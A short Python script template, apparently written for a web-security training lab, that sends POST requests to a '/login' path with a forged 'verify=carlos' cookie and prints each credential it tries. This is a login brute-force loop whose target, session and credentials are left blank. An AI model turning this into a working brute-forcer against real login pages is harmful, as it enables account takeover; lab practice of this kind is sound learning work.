import requests
from requests_toolbelt.utils import dump
import sys
import os


url = ''
session_key = ''
path= '/login'

HEADERS = {'Host': url,
            'Cookie':'session='+session_key+'; verify=carlos',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url+path,
            'Origin': url,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin'} 


def logging_hook(response, *args, **kwargs):
    data = dump.dump_all(response)
    print(data.decode('utf-8'))

http = requests.Session()
# http.hooks["response"] = [logging_hook]


i = 0
req_num = 1
credentials = ''
for i in range(req_num):
    r = http.post('https://'+url+path,headers=HEADERS, data=credentials, allow_redirects=False)
    sys.stdout.write('\r'+'trying: '+credentials)
    sys.stdout.flush()